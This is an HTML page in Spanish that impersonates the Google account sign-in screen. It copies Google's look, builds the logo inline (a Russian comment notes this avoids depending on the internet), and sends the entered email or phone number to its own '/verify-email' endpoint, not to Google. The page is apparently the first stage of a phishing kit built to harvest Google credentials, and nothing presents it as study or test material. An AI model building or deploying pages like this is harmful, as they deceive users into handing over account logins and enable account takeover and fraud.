<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
    <title>Iniciar sesión - Cuenta de Google</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Roboto',sans-serif;}
        body{background:#fff;color:#202124;font-size:14px;min-height:100vh;display:flex;align-items:center;justify-content:center;}
        .container{width:100%;max-width:450px;padding:48px 40px 36px;border:1px solid #dadce0;border-radius:8px;margin:20px;}
        .logo{text-align:center;margin-bottom:16px;}
        .logo img{height:24px;}
        .header{text-align:center;margin-bottom:24px;}
        .header h1{font-size:24px;font-weight:400;color:#202124;margin-bottom:8px;}
        .header p{color:#5f6368;font-size:16px;font-weight:400;}
        .form-group{margin-bottom:24px;}
        .google-input{width:100%;padding:13px 15px;font-size:16px;border:1px solid #dadce0;border-radius:4px;transition:border 0.1s;}
        .google-input:focus{outline:none;border:2px solid #1a73e8;padding:12px 14px;}
        .links{margin:8px 0 32px;}
        .links a{color:#1a73e8;text-decoration:none;font-size:14px;font-weight:500;}
        .links a:hover{text-decoration:underline;}
        .info{color:#5f6368;font-size:14px;margin:24px 0;line-height:1.5;}
        .button-group{display:flex;justify-content:space-between;align-items:center;margin-top:32px;}
        .create-account{color:#1a73e8;font-weight:500;text-decoration:none;padding:10px 8px;border-radius:4px;}
        .create-account:hover{background:#f6fafe;}
        .next-button{background:#1a73e8;color:white;border:none;padding:10px 24px;font-size:14px;font-weight:500;border-radius:4px;cursor:pointer;}
        .next-button:hover{background:#0d62d9;}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <!-- Логотип Google в виде SVG, чтобы не зависеть от интернета -->
            <svg width="75" height="24" viewBox="0 0 75 24"><path d="M69.18 5.5h-3.04v10.4h3.04c1.1 0 2.1-.4 2.8-1.1.8-.8 1.2-1.8 1.2-3.1v-2c0-1.3-.4-2.3-1.2-3.1-.7-.7-1.7-1.1-2.8-1.1z" fill="#4285F4"/><path d="M36.8 12.9c0-1.7-.7-3.2-1.8-4.3-1.1-1.1-2.6-1.8-4.3-1.8s-3.2.7-4.3 1.8c-1.1 1.1-1.8 2.6-1.8 4.3s.7 3.2 1.8 4.3c1.1 1.1 2.6 1.8 4.3 1.8s3.2-.7 4.3-1.8c1.1-1.1 1.8-2.6 1.8-4.3z" fill="#34A853"/><path d="M50.2 5.5h-2.9v10.4h2.9c1.6 0 3-.6 4-1.7 1.1-1.1 1.7-2.5 1.7-4.1v-2c0-1.6-.6-3-1.7-4.1-1-1.1-2.4-1.7-4-1.7z" fill="#FBBC05"/><path d="M17.8 5.5h-3.4v10.4h3.4c1.1 0 2.1-.4 2.9-1.1.8-.8 1.2-1.8 1.2-3.1v-2c0-1.3-.4-2.3-1.2-3.1-.8-.7-1.8-1.1-2.9-1.1z" fill="#EA4335"/><path d="M8.2 5.5H1.9v10.4h6.3c.9 0 1.7-.3 2.3-.9.6-.6.9-1.4.9-2.3V8.7c0-.9-.3-1.7-.9-2.3-.6-.6-1.4-.9-2.3-.9z" fill="#C5221F"/></svg>
        </div>
        <div class="header">
            <h1>Iniciar sesión</h1>
            <p>Utiliza tu cuenta de Google</p>
        </div>
        <form action="/verify-email" method="post">
            <div class="form-group">
                <input type="email" class="google-input" name="email" placeholder="Correo electrónico o teléfono" required autofocus>
            </div>
            <div class="links">
                <a href="https://accounts.google.com/signup/v2/createaccount" target="_blank">¿Has olvidado tu correo electrónico?</a>
            </div>
            <div class="info">
                ¿No es tu ordenador? Usa el modo de invitado para iniciar sesión de forma privada.
                <a href="https://support.google.com/chrome/answer/6130773" target="_blank">Más información</a>
            </div>
            <div class="button-group">
                <a href="https://accounts.google.com/signup/v2/createaccount" class="create-account" target="_blank">Crear cuenta</a>
                <button type="submit" class="next-button">Siguiente</button>
            </div>
        </form>
    </div>
</body>
</html>
